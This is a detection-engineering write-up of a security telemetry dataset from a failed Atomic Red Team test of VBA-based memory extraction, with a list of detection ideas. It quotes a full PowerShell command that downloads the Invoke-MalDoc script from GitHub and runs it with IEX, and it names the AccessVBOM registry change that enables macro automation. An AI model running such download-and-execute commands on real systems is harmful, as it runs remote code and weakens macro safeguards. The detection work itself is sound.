# T1059.005-3: Visual Basic — Extract Memory via VBA

## Technique Context

T1059.005 focuses on Visual Basic for Applications (VBA) execution, a technique widely used by adversaries to deliver malicious code through Office documents. VBA macros provide a powerful scripting environment within Microsoft Office applications, allowing attackers to execute arbitrary code when users open weaponized documents. The "Extract Memory via VBA" variant specifically demonstrates using VBA to access and extract process memory, a capability often leveraged for credential harvesting, process injection preparation, or reconnaissance activities.

Detection engineers typically focus on macro execution telemetry, process creation from Office applications, suspicious API calls (particularly memory-related functions), and network activity initiated by Office processes. The technique is particularly dangerous because it leverages trusted applications and can bypass many application whitelisting solutions.

## What This Dataset Contains

This dataset captures a failed attempt to execute VBA macro code through PowerShell automation. The key telemetry shows:

**PowerShell Command Execution**: Security event 4688 shows the execution of a complex PowerShell command: `"powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing) Invoke-Maldoc -macroFile "C:\AtomicRedTeam\atomics\T1059.005\src\T1059_005-macrocode.txt" -officeProduct "Word" -sub "Extract"}`

**Failed COM Object Creation**: PowerShell event 4100 captures the critical failure: `Error Message = Retrieving the COM class factory for component with CLSID {00000000-0000-0000-0000-000000000000} failed due to the following error: 80040154 Class not registered (Exception from HRESULT: 0x80040154 (REGDB_E_CLASSNOTREG))`

**Script Block Logging**: PowerShell events 4104 reveal the complete Invoke-MalDoc function code, showing its purpose to programmatically create and execute Office documents with VBA macros, including registry manipulation to enable VBA object model access.

**Network Activity**: Sysmon event 22 shows DNS resolution for `raw.githubusercontent.com`, indicating the script successfully downloaded the Invoke-MalDoc PowerShell module.

**Process Telemetry**: Standard process creation and termination events for PowerShell instances and a `whoami.exe` execution for system discovery.

## What This Dataset Does Not Contain

The dataset lacks the core technique execution due to the COM object creation failure. Specifically missing:

**No Office Application Launch**: Microsoft Word was never instantiated due to the COM registration error, preventing actual VBA macro execution and memory extraction activities.

**No VBA-Specific Telemetry**: Events like Office application process creation, macro execution warnings, or VBA runtime activity are absent since the Office COM object failed to initialize.

**No Memory Access Events**: The intended memory extraction operations never occurred, so there are no Sysmon process access events (beyond normal PowerShell operations) or suspicious memory manipulation patterns.

**No Registry VBA Modifications**: The script intended to modify `HKCU:\Software\Microsoft\Office\[version]\[product]\Security\AccessVBOM` but failed before reaching this point.

This failure appears to be an environmental issue where Microsoft Office COM objects are not properly registered on the test system, preventing the automation approach from working.

## Assessment

This dataset provides limited value for detecting successful T1059.005 implementations but offers excellent insight into detection of VBA automation attempts. The PowerShell telemetry is comprehensive and would be highly effective for identifying similar attack vectors, even when they fail. The command-line logging captures the full attack chain intent, and the COM error provides a clear failure indicator.

For building detections around successful VBA macro execution, this dataset would need to be supplemented with telemetry from functioning Office environments. However, it excellently demonstrates how robust logging can capture attack attempts even when environmental factors prevent full technique execution.

## Detection Opportunities Present in This Data

1. **PowerShell VBA Automation Detection**: Monitor PowerShell script blocks for functions like "Invoke-MalDoc" or references to Office COM objects ("Word.Application", "Excel.Application") combined with VBA-related parameters.

2. **Suspicious Office Automation Command Lines**: Alert on PowerShell command lines containing combinations of Office product names, macro file references, and COM object creation patterns.

3. **GitHub RAW Content Downloads**: Detect PowerShell web requests to `raw.githubusercontent.com` followed by immediate script execution, particularly when combined with Office-related keywords.

4. **COM Object Creation Failures**: Monitor PowerShell error events (4100) for COM class factory failures with Office-related CLSID patterns, which may indicate attack attempts on systems without proper Office installations.

5. **Registry VBA Access Attempts**: Watch for PowerShell accessing or modifying `AccessVBOM` registry keys, which indicates attempts to enable programmatic VBA execution.

6. **PowerShell Process Chains**: Identify PowerShell parent-child relationships where child processes contain Office automation parameters, especially when combined with external script downloads.

7. **Suspicious Macro File References**: Alert on PowerShell accessing files with "macro" in the path or filename, particularly in temporary or atomic red team directories.

8. **TLS Protocol Changes in PowerShell**: Monitor for explicit TLS protocol modifications in PowerShell scripts, often used to ensure compatibility with external downloads in attack scripts.
